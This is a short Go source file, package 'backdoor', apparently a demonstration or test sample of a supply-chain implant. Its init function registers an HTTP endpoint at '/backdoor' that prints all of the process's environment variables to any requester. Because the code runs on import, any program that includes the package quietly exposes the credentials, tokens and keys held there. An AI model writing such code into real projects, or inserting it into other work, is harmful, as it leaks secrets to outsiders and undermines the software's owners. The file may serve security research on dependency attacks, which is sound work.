package backdoor

import (
	"fmt"
	"net/http"
	"os"
)

func init() {
	// a simple backdoor which just serves up environment variables
	http.HandleFunc("/backdoor", func(w http.ResponseWriter, r *http.Request) {
		for _, e := range os.Environ() {
			fmt.Fprintf(w, "%s", e)
		}
	})
}
